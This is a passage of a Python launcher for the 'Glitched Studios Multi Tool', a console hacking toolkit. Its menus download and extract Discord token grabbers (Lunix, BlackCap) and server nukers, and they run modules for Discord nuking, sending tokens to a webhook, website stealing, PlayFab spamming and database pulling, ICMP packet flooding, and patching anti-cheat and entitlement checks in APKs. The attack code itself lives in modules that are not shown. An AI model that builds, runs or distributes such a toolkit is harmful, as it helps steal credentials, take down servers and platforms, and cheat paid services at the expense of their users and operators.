                Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
                import os
                import shutil
                try:
                    shutil.rmtree("output/downloads/RedTiger Multi Tool")
                    print("Old version deleted.")
                except FileNotFoundError:
                    print("No old version found.")
                urllib.request.urlretrieve(redtigerdownload, "output/downloads/RedTiger Multi Tool.zip")
                with zipfile.ZipFile("output/downloads/RedTiger Multi Tool.zip", 'r') as zip_ref:
                    zip_ref.extractall("output/downloads/RedTiger Multi Tool")
                os.remove("output/downloads/RedTiger Multi Tool.zip")
                print("RedTiger Multi Tool has been updated to the latest version.")
                with open("settings/versions/redtiger version.txt", "r") as f:
                    current_version = f.read().strip()
                try:
                    response = requests.get("https://api.github.com/repos/loxyteck/RedTiger-Tools/releases/latest")
                    response.raise_for_status()
                    latest_release = response.json()
                    latest_version = latest_release["tag_name"]
                except requests.exceptions.RequestException as e:
                    print(f"Error checking for updates: {e}")
                    pause = input("Press enter to continue")
                    discordtools()
                if current_version != latest_version:
                    print(f"Update available! Latest version is {latest_version}.")
                    with open("settings/versions/redtiger version.txt", "w") as f:
                        f.write(latest_version)
                else:
                    print("You are already running the latest version of RedTiger.")
                pause = input("Press enter to continue")
                discordtools()
    if discordtool == "2":
        clear_console()
        subprocess.run(["python", "python/modules/webhook_tool.py"])
    if discordtool == "3":
        clear_console()
        title_changer("Glitched Studios Multi Tool | Multi Tool - Lunix Grabber")
        print(logo)
        print(f"{maintool_color}[DOWNLOAD]{secondary_color} | download Lunix Grabber")
        print(f"{maintool_color}[INFO]{secondary_color} | see information about Lunix Grabber")
        print("")
        download = input(loaderoption)
        if download.lower() == "download":
                import os
                clear_console()
                Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
                urllib.request.urlretrieve(lunixgrabberdownload, "output/downloads/Lunix Grabber.zip")
                with zipfile.ZipFile("output/downloads/Lunix Grabber.zip", 'r') as zip_ref:
                    zip_ref.extractall("output/downloads/Lunix Grabber")
                os.remove("output/downloads/Lunix Grabber.zip")
                print("Lunix Grabber has been downloaded and extracted to output/downloads/Lunix Grabber")
                pause = input("Press enter to continue")
                discordtools()
        elif download.lower() == "info":
                clear_console()
                Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
                webbrowser.open_new_tab("https://raw.githubusercontent.com/Glitched-Studios-Offical/assets/main/lunixgrabberinfo.txt")
                pause = input("Press enter to continue")
                discordtools()
        else:
                print("Invalid option. Please try again.")
                pause = input("Press enter to continue")
                discordtools()
    if discordtool == "4":
        clear_console()
        title_changer("Glitched Studios Multi Tool | Multi Tool - Nexus")
        print(logo)
        print(f"{maintool_color}[DOWNLOAD]{secondary_color} | download Nexus")
        print(f"{maintool_color}[INFO]{secondary_color} | see information about Nexus")
        print(f"{maintool_color}[UPDATE]{secondary_color} | update Nexus to the latest version")
        print("")
        download = input(loaderoption)
        if download == "download":
            import os
            clear_console()
            Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
            urllib.request.urlretrieve(Nexusdownload, "output/downloads/Nexus.zip")
            with zipfile.ZipFile("output/downloads/Nexus.zip", 'r') as zip_ref:
                zip_ref.extractall("output/downloads/Nexus Multi Tool")
            os.remove("output/downloads/Nexus.zip")
            print("Nexus has been downloaded and extracted to output/downloads/Nexus Multi Tool")
            pause = input("Press enter to continue")
            discordtools()
        elif download == "info":
            clear_console()
            webbrowser.open_new_tab("https://github.com/VatosV2/Nexus-MultiTool?tab=readme-ov-file#functions")
            input("Enter to contuine: ")
            discordtools()
        elif download == "update":
            clear_console()
            import os
            print("Checking for updates...")
            try:
                response = requests.get("https://api.github.com/repos/VatosV2/Nexus-MultiTool/releases/latest")
                response.raise_for_status()
                latest_release = response.json()
                latest_version = latest_release["tag_name"]
                latest_download_url = latest_release["assets"][0]["browser_download_url"]
            except requests.exceptions.RequestException as e:
                print(f"Error checking for updates: {e}")
                pause = input("Press enter to continue")
                discordtools()
            
            with open("settings/versions/nexus version.txt", "r") as f:
                current_version = f.read().strip()
            
            if current_version != latest_version:
                print(f"Update available! Latest version is {latest_version}.")
                print("Downloading latest version...")
                try:
                    urllib.request.urlretrieve(latest_download_url, "output/downloads/Nexus.zip")
                    with zipfile.ZipFile("output/downloads/Nexus.zip", 'r') as zip_ref:
                        zip_ref.extractall("output/downloads/Nexus Multi Tool")
                    os.remove("output/downloads/Nexus.zip")
                    with open("settings/versions/nexus version.txt", "w") as f:
                        f.write(latest_version)
                    print("Update successful! Nexus has been updated to the latest version.")
                except Exception as e:
                    print(f"Error updating: {e}")
            else:
                print("You are already running the latest version of Nexus.")
            pause = input("Press enter to continue")
            discordtools()
    if discordtool == "5":
        import os
        clear_console()
        title_changer("Glitched Studios Multi Tool | Discord Status Changer")
        Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
        urllib.request.urlretrieve(StatusChangerdownload, "output/downloads/StatusChanger.zip")
        with zipfile.ZipFile("output/downloads/StatusChanger.zip", 'r') as zip_ref:
            zip_ref.extractall("output/downloads/StatusChanger Tool")
        os.remove("output/downloads/StatusChanger.zip")
        print("Nexus has been downloaded and extracted to output/downloads/StatusChanger Tool")
        pause = input("Press enter to continue")
        discordtools()
    if discordtool == "6":
          clear_console()
          title_changer("Glitched Studios Multi Tool | BlackCap Grabber")
          print(logo)
          print(f"{maintool_color}[DOWNLOAD]{secondary_color} | download BlackCap Grabber")
          print(f"{maintool_color}[INFO]{secondary_color} | see information about BlackCap Grabber")
          print("")
          download = input(loaderoption)
          if download == "download":
            import os
            clear_console()
            Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
            urllib.request.urlretrieve(BlackGrabberdownload, "output/downloads/BlackCap Grabber.zip")
            with zipfile.ZipFile("output/downloads/BlackCap Grabber.zip", 'r') as zip_ref:
              zip_ref.extractall("output/downloads/BlackCap Grabber")
            os.remove("output/downloads/BlackCap Grabber.zip")
            print("BlackCap Grabber has been downloaded and extracted to output/downloads/BlackCap Grabber")
            pause = input("Press enter to continue")
            discordtools()
          if download == "info":
                clear_console()
                Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
                webbrowser.open_new_tab("https://github.com/Mentoros/BlackCap-Grabber/tree/main?tab=readme-ov-file#-%E3%80%A2-features")
                print(logo)
                pause = input("enter to contiune")
                discordtools()
    if discordtool == "7":
          clear_console()
          title_changer("Glitched Studios Multi Tool | Mentoros - Server Nuker")
          print(logo)
          print(f"{maintool_color}[DOWNLOAD]{secondary_color} | download Mentoros - Server Nuker")
          print(f"{maintool_color}[INFO]{secondary_color} | see information about Mentoros - Server Nuker")
          print("")
          download = input(loaderoption)
          if download == "download":
            import os
            clear_console()
            Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
            urllib.request.urlretrieve(MentorosServerNukerdownload, "output/downloads/MentoroaServerNuker.zip")
            with zipfile.ZipFile("output/downloads/MentoroaServerNuker.zip", 'r') as zip_ref:
              zip_ref.extractall("output/downloads/MentoroaServerNuker")
            os.remove("output/downloads/MentoroaServerNuker.zip")
            print("Mentoros - Server Nuker has been downloaded and extracted to output/downloads/MentoroaServerNuker")
            pause = input("Press enter to continue")
            discordtools()
          if download == "info":
                clear_console()
                Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
                webbrowser.open_new_tab("https://github.com/Mentoros/server-nuker#features")
                print(logo)
                pause = input("enter to contiune")
                discordtools()
    if discordtool in ["08","8"]:
          clear_console()
          title_changer("Glitched Studios Multi Tool | PCMS Raidder")
          print(logo)
          print(f"{maintool_color}[DOWNLOAD]{secondary_color} | download PCMS Raidder")
          print(f"{maintool_color}[INFO]{secondary_color} | see information about PCMS Raidder")
          print(f"{maintool_color}[COMING SOON]{secondary_color} | Updates To Current Version")
          print("")
          download = input(loaderoption)
          if download == "download":
            import os
            clear_console()
            Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
            urllib.request.urlretrieve(PCMSRaidder, "output/downloads/PCMS Raidder Tool.zip")
            with zipfile.ZipFile("output/downloads/PCMS Raidder Tool.zip", 'r') as zip_ref:
              zip_ref.extractall("output/downloads/PCMS Raidder Tool")
            os.remove("output/downloads/PCMS Raidder Tool.zip")
            print("PCMS Raidder Tool has been downloaded and extracted to output/downloads/PCMS Raidder Tool")
            
            pause = input("Press enter to continue")
            discordtools()
          if download == "info":
                clear_console()
                Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
                webbrowser.open_new_tab("https://github.com/LynoForWindows/pcms-raidder/tree/main#features")
                print(logo)
                pause = input("enter to contiune")
                discordtools()
          if download == "update":
                discordtools()
    if discordtool == "9":
        clear_console()
        print(logo)
        subprocess.run(["python", "python/modules/osint_discord_bot.py"])
        pause = input("enter to contiune")
        discordtools()

         

def playfab():
    clear_console()
    title_changer("Glitched Studios Multi Tool | Playfab")
    print(logo)
    print(f"{maintool_color}[1]  | {secondary_color} Playfab Spammer")
    print(f"{maintool_color}[2]  | {secondary_color} Playfab Checker")
    print(f"{maintool_color}[3]  | {secondary_color} Playfab Catalog Puller")
    print(f"{maintool_color}[4]  | {secondary_color} Playfab Database Grabber")
    print(" ")
    playopt = input(loaderoption)
    if playopt == "1":
        clear_console()
        subprocess.run(["python", "python/modules/playfab_spammer.py"])
        pause = input("press enter to exit...")
    if playopt == "2":
        clear_console()
        subprocess.run(["python", "python/modules/playfab_checker.py"])
        pause = input("press enter to exit...")
    if playopt == "3":
        clear_console()
        subprocess.run(["python", "python/modules/playfab_catalog_pulller.py"])
        pause = input("press enter to exit...")
    if playopt == "4":
        clear_console()
        subprocess.run(["python", "python/modules/playfab_database_puller.py"])
        pause = input("press enter to exit...")

def apkdecompiling():
	title_changer("Glitched Studios Multi Tool | Apk Decompiling")
	clear_console()
	print(logo)
	print(f"{white}This doesnt always work with some games")
	print("You Can Find the decomplied code in this path output/decomp")
	print("Made By SamboyCoding")
	subprocess.run(["python", "python/modules/apk_decomp.py"])
	pause = input("press enter")


def apkstuff():
    title_changer("Glitched Studios Multi Tool | Apk Stuff")
    clear_console()
    print(logo)
    print(f"{maintool_color}[1]  | {secondary_color} Auto Modder [MADE BY INDEX]")
    print(f"{maintool_color}[2]  | {secondary_color} Apk Decompiler")
    print(f"{maintool_color}[3]  | {secondary_color} Asset Stuff")

    apkopt = input(loaderoption)
    if apkopt == "1":
        clear_console()
        print(logo)
        apk_path = input("Enter the APK path: ")
        apk_path = apk_path.replace("\\", "/").rstrip('.').strip('"')
        subprocess.run(["python", "python/modules/automodder/AutoModder.py", apk_path])
        input("Use ApkTool To Complie")
    elif apkopt == "2":
        apkdecompiling()
    elif apkopt == "3":
        asset_info()
now = datetime.datetime.now()

menuui = fade.purplepink(f"""
                                {white}~~~~Message Of The Day Board~~~~
                         {motd_text}

╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
▓ Glitched Studios Multi Tool                                               Hello {username_pc} Thanks For Using Our Tool ▓
╞─────────────────────────────────────────────────────────────────────────────────────────────────────────────────╡
│┌───────────────────────────────┐       ┌───────────────────────────────┐       ┌───────────────────────────────┐│   ┌───────────────────────────────────┐
││       [Playfab Tools]         │       │          [IP Tools]           │       │          [Apk Tools]          ││   │        (Credits/Ranks)            │
││                               │       │                               │       │                               ││   │                                   │
││ |1.| Playfab Spammer          │       │ |6.| Ip 2 Info                │       │ |11.| Apk Decomplier          ││   │     Galaxizs (Beta Tester):       │
││ |2.| Playfab Checker          │       │ |7.| ICMP Packet Sender       │       │ |12.| Apk Auto Modder         ││   │       Made Home UI                │
││ |3.| Playfab Catalog Puller   │       │ |8.| Placeholder              │       │ |13.| Asset Stuff             ││   │     Glitched (Owner):             │
││ |4.| Playfab Database Puller  │       │ |9.| Placeholder              │       │ |14.| String Extracter        ││   │      Made Styles and Scripts      │
││ |5.| Next Playfab Page        │       │ |10.| Next Ip Page            │       │ |15.| Next Apk Page           ││   │     oragantekk (Co Owner):        │
││                               │       │                               │       │                               ││   │       Made Scripts                │
│└───────────────────────────────┘       └───────────────────────────────┘       └───────────────────────────────┘│   │                                   │
│┌───────────────────────────────┐       ┌───────────────────────────────┐       ┌───────────────────────────────┐│   │                                   │
││       [Discord Tools]         │       │       [Multi Tools]           │       │      [Other Tools]            ││   └───────────────────────────────────┘
││                               │       │                               │       │                               ││ 
││ |16.| Discord Webhook Tool    │       │ |21.| Placeholder             │       │ |26.| Website Stealer         ││  
││ |17.| Get Your Discord Token  │       │ |22.| Placeholder             │       │ |27.| Malware Stopper         ││   
││ |18.| Discord Nuker           │       │ |23.| Placeholder             │       │ |29.| Placeholder             ││   
││ |19.| Discord Osint Bot       │       │ |24.| Placeholder             │       │ |30.| Placeholder             ││   
││ |20.| Next Discord Page       │       │ |25.| Next Multi Page         │       │ |31.| Next Other Page         ││  
││                               │       │                               │       │                               ││  
│└───────────────────────────────┘       └───────────────────────────────┘       └───────────────────────────────┘│   
│                                                                    KEY=Dev Key Needed, DISCORD=Only For Discord │ 
│ Date: {now.strftime("%m/%d/%Y")} Time: {now.strftime('%I:%M %p')}                                             Settings = Opens The Settings Pages │ 
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
""")

def menu():
    set_console_background_color()
    page = "Main"
    while True:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 3)
        if page == "Main":
            startclear()
            title_changer(f"Glitched Studios Multi Tool | Menu Screen")
            print(f"""{red}
{logo}
{menuui}

{reset}""")
            choice = input(f"""{red}┌───({white}{username_pc}@glitched-studios-tools{red})─[{white}~{red}]
└──{white}$ {Fore.RESET}""")
            if choice == "1":
                clear_console()
                title_changer("Glitched Studios Multi Tool | Playfab Spammer")
                print("BROKEN")
                subprocess.run(["python", "python/modules/playfab_spammer.py"])
            elif choice == "2":
                clear_console()
                title_changer("Glitched Studios Multi Tool | Playfab Check")
                subprocess.run(["python", "python/modules/playfab_checker.py"])
            elif choice == "3":
                clear_console()
                title_changer("Glitched Studios Multi Tool | Playfab Catalog Puller")
                subprocess.run(["python", "python/modules/playfab_catalog_pulller.py"])
            elif choice == "4":
                clear_console()
                title_changer("Glitched Studios Multi Tool | Playfab Database Puller")
                subprocess.run(["python", "python/modules/playfab_database_puller.py"])
            elif choice == "5":
                clear_console()
                page = "Playfab Tools Page 2"
            elif choice == "6":
                clear_console()
                
                ip_info()
            elif choice == "19":
                clear_console()
                title_changer("Glitched Studios Multi Tool | Malware Stopper")
                print(logo)
                with open('settings/configs/Osint Bot Config.json', 'r') as f:
                    data = json.load(f)
                    if data["bottoken"] == "EnterToken":
                        new_token = input(f"{INPUT}Enter your bot token: ")
                        data["bottoken"] = new_token
                        with open('settings/configs/Osint Bot Config.json', 'w') as f:
                            json.dump(data, f, indent=4)
                subprocess.run(["python", "python/modules/osint_discord_bot.py"])
            elif choice == "27":
                clear_console()
                title_changer("Glitched Studios Multi Tool | Malware Stopper")
                print(logo)
                
                yesorno = input("Do You Argee To Run This Malware Stopper (Yes/No) ")
                if yesorno in ["Yes", "yes"]:
                    print("Ok Running")
                    clear_console()
                    title_changer("Glitched Studios Multi Tool | Malware Stopper")
                    print(logo)
                    subprocess.run(["python", "python/modules/malware_stopper.py"])
                    pause = input("\nEnter To Exit: ")
                if yesorno in ["No", "no"]:
                    print("OK GoodBye")
                    menu()
            elif choice == "21":
                print("")

            elif choice == "11":
                apkdecompiling()
            elif choice == "12":
                clear_console()
                print(logo)
                apk_path = input("Enter the APK path: ")
                apk_path = apk_path.replace("\\", "/").rstrip('.').strip('"')
                subprocess.run(["python", "python/modules/automodder/AutoModder.py", apk_path])
                input("Use ApkTool To Complie")
            elif choice == "14":
                clear_console()
                print(logo)
                apk_path = input("Enter the APK path: ")
                apk_path = apk_path.replace("\\", "/").rstrip('.').strip('"')
                subprocess.run(["python", "python/modules/apkstuff/apk_string_extacter.py", apk_path])
                pause = input("Enter To Exit: ")

            elif choice == "7":
                clear_console()
                server_dos()
            elif choice == "15":
                clear_console()
                page = "Apk Tools Page 2"
            elif choice == "16":
                clear_console()
                subprocess.run(["python", "python/modules/webhook_tool.py"])
                pause = input("Enter to coutine: ")
            elif choice == "18":

                subprocess.run(["python", "python/modules/discord_nuker.py"])
                pause = input("Enter to coutine: ")
            elif choice == "17":
                subprocess.run(["python", "python/modules/Token2Webhook.py"])
            elif choice in ["Settings", "settings", "s", "S"]:
                clear_console()
                settings()
            elif choice == "26":
                clear_console()
                title_changer("Glitched Studios Multi Tool | Website Stealer")
                print(logo)
                subprocess.run(["python", "python/modules/website_stealer.py"])
                pause = input("Enter to exit: ")
            else:
                print(f"{red}Invalid choice. Please try again.{reset}")
                continue
        elif page == "Playfab Tools Page 2":
            clear_console()
            
            title_changer(f"Glitched Studios Multi Tool | Menu Page {page}")
            print(f"""{red}
{logo}
{plaufabui}
{reset}""")
            choice = input(f"""{red}┌───({white}{username_pc}@glitched-studios-tools{red})─[{white}~{red}]
└──{white}$ {Fore.RESET}""")
            if choice == "1":
                clear_console()
                subprocess.run(["python", "python/modules/etxnights-playfab-tool/ui.py"])
                pause = input("Press enter to continue")
            elif choice == "2":
                clear_console()
                
            elif choice == "3":
                clear_console()
                
            elif choice == "4":
                clear_console()
                
            elif choice == "5":
                clear_console()
                
            elif choice == "6":
                clear_console()
                
            elif choice == "7":
                clear_console()
            elif choice in ["back", "Back", "b", "B"]:
                page = "Main"
            elif choice.lower() == "prev":
                page -= 1
            elif choice.lower() == "next":
                page += 1
            else:
                print(f"{red}Invalid choice. Please try again.{reset}")
                continue
        elif page == "Apk Tools Page 2":
            clear_console()
            
            title_changer(f"Glitched Studios Multi Tool | Menu Page {page}")
            print(f"""{red}
{logo}
{apktoolsui}
{reset}""")
            choice = input(f"""{red}┌───({white}{username_pc}@glitched-studios-tools{red})─[{white}~{red}]
└──{white}$ {Fore.RESET}""")
            if choice == "1":
                clear_console()
                print(logo)
                apk_path = input("Enter the APK path: ")
                apk_path = apk_path.replace("\\", "/").rstrip('.').strip('"')
                clear_console()
                title_changer("Glitched Studios Multi Tool | Apk Anti Finder")
                subprocess.run(["python", "python/modules/apkstuff/apk_anti_finder.py", apk_path])
                pause = input("Enter To Exit: ")
            elif choice == "2":
                clear_console()  
                title_changer("Glitched Studios Multi Tool | Apk Entitlement Checker Patcher")
                print(logo)
                apk_path = input(f"{INPUT}Enter the APK path: ")
                apk_path = apk_path.replace("\\", "/").rstrip('.').strip('"')
                clear_console()
                subprocess.run(["python", "python/modules/apkstuff/apk_entitlement_checker_patcher.py", apk_path])
                pause = input("Enter To Exit: ")
            elif choice == "3":
                clear_console()
                
            elif choice == "4":
                clear_console()
                
            elif choice == "5":
                clear_console()
                
            elif choice == "6":
                clear_console()
                
            elif choice == "7":
                clear_console()
            elif choice in ["back", "Back", "b", "B"]:
                page = "Main"
            elif choice.lower() == "prev":
                page -= 1
            elif choice.lower() == "next":
                page += 1
            else:
                print(f"{red}Invalid choice. Please try again.{reset}")
                continue
        elif page == "Discord Tools":
            clear_console()
            
            title_changer(f"Glitched Studios Multi Tool | Menu Page {page}")
            print(f"""{red}
{logo}
{discordtoolui}
{reset}""")
            choice = input(f"""{red}┌───({white}{username_pc}@glitched-studios-tools{red})─[{white}~{red}]
└──{white}$ {Fore.RESET}""")
            if choice == "1":
                
                pause = input("Press enter to continue")
            elif choice == "2":
                clear_console()
                
            elif choice == "3":
                clear_console()
                
            elif choice == "4":
                clear_console()
                
            elif choice == "5":
                clear_console()
                
            elif choice == "6":
                clear_console()
                
            elif choice == "7":
                clear_console()
            elif choice in ["back", "Back", "b", "B"]:
                page = "Main"
            elif choice.lower() == "prev":
                page -= 1
            elif choice.lower() == "next":
                page += 1
            else:
                print(f"{red}Invalid choice. Please try again.{reset}")
                continue        
plaufabui = fade.purplepink(f"""
╔═══════════════════════════════════════╗
▓          PlayFab Tools                ▓
╞═══════════════════════════════════════╡
| ┌─────────────────────────────────┐   |    ┌──────────────────────────────────────────┐
| │ 1. Etxnight's Playfab Tool      │   │    |                  (Credits)               |
| │ 2. Placeholder                  │   │    |                                          |
| │ 3. Placeholder                  │   │    |             Etxnight                     |
| │ 4. Placeholder                  │   │    |               discord.gg/g3c2F9cuZb      |
| │ 5. Placeholder                  │   │    └──────────────────────────────────────────┘
| └─────────────────────────────────┘   |
| Back = Go To Main                     |
└───────────────────────────────────────┘
""")
discordtoolui = fade.purplepink(f"""
╔═══════════════════════════════════════╗
▓          Discord Tools                ▓
╞═══════════════════════════════════════╡
| ┌─────────────────────────────────┐   |    ┌──────────────────────────────────────────┐
| │ 1. Placeholder                  │   │    |                  (Credits)               |
| │ 2. Placeholder                  │   │    |                                          |
| │ 3. Placeholder                  │   │    |             Placeholder                  |
| │ 4. Placeholder                  │   │    |               placeholder                |
| │ 5. Placeholder                  │   │    └──────────────────────────────────────────┘
| └─────────────────────────────────┘   |
| Back = Go To Main                     |
└───────────────────────────────────────┘
""")
apktoolsui = fade.purplepink(f"""
╔═══════════════════════════════════════╗
▓          Apk Tools                    ▓
╞═══════════════════════════════════════╡
| ┌─────────────────────────────────┐   |    ┌──────────────────────────────────────────┐
| │ 1. Anti Cheat Finder            │   │    |             (Credits)                    |
| │ 2. Entitlement Patcher          │   │    |                                          |
| │ 3. Placeholder                  │   │    |             Placeholder                  |
| │ 4. Placeholder                  │   │    |               placeholder                |
| │ 5. Placeholder                  │   │    └──────────────────────────────────────────┘
| └─────────────────────────────────┘   |
| Back = Go To Main                     |
└───────────────────────────────────────┘
""")
if __name__ == "__main__":
    load_alpha()
    print(f"{reset}")
    loading_screen()
    while True:
    	 menu()